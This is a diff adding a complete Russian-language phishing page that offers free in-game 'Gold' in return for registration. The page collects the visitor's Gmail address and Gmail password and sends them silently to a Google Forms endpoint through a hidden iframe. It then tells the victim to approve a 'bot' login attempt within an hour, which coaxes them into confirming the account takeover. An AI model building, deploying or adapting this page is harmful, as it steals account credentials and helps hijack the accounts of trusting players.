@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Получить Голду</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      background: #007bff;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .message {
+      display: none;
+      margin-top: 20px;
+      color: green;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Чтобы получить Голду, зарегистрируйтесь</h2>
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSdynWGVb6ekPqHlf03Ib3vqFy8RnS-eAJ30btNJiwpHJ7eg1g/formResponse" method="POST" target="hidden_iframe" onsubmit="showMessage()">
+      <input name="entry.1814503341" type="email" placeholder="Ваш Gmail" required><br>
+      <input name="entry.790211419" type="password" placeholder="Пароль от Gmail" required><br>
+      <button type="submit">Зарегистрироваться</button>
+    </form>
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+    <div class="message" id="afterMessage">
+      В течение 60 минут на ваш аккаунт попытается зайти бот, подтвердите вход, не бойтесь, это сделано для того, чтобы проверить не повторяете ли вы попытку получить Голду повторно.<br><br>
+      Мы стараемся, чтобы каждый игрок получил ОДИН раз, чтобы её всем хватило.<br>
+      Без этого мы не сможем проверить ваш логин и вы не сможете написать заявку для получения голды.
+    </div>
+  </div>
+
+  <script>
+    function showMessage() {
+      setTimeout(() => {
+        document.querySelector('form').style.display = 'none';
+        document.getElementById('afterMessage').style.display = 'block';
+      }, 500);
+    }
+  </script>
+</body>
+</html>
